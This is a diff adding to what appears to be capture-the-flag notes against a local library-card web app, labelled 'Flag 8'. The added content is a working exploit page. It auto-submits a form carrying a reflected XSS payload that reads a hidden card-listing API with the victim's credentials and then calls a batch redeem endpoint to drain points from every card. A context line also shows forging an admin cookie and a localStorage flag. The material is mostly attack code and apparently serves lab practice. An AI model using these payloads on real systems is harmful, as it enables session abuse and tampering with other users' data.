@@ -158,3 +158,28 @@ localStorage.setItem('isAdmin','true'); document.cookie = "Role-Identifier=Admin
 </body>
 </html>
 ```
+
+# Read hidden API for ID Cards then use XSS to modify values with by -1 incrementing
+```JavaScript
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Flag 8</title>
+</head>
+<body>
+  <form id="searchForm" method="GET" action="http://localhost:7149/search">
+    <input type="text" name="search"
+      value="<img src=x onerror='(async function(){try{const r=await fetch(&quot;/api/libraryCard/list-all&quot;,{credentials:&quot;include&quot;});const arr=await r.json();const ids=arr.map(function(o){return o.libraryCard}).join(&quot;,&quot;);const pts=arr.map(function(o){return -Math.abs(o.points)}).join(&quot;,&quot;);await fetch(&quot;/api/libraryCard/redeem/batch?libraryCards=&quot;+ids+&quot;&amp;points=&quot;+pts,{method:&quot;GET&quot;,credentials:&quot;include&quot;});window.location.href=&quot;/libraryCard&quot;;}catch(e){console.error(e);window.location.href=&quot;/libraryCard&quot;;}})()'>"/>
+  </form>
+
+  <script>
+    window.addEventListener('load', function () {
+      setTimeout(function () {
+        document.getElementById('searchForm').submit();
+      }, 250);
+    });
+  </script>
+</body>
+</html>
+```
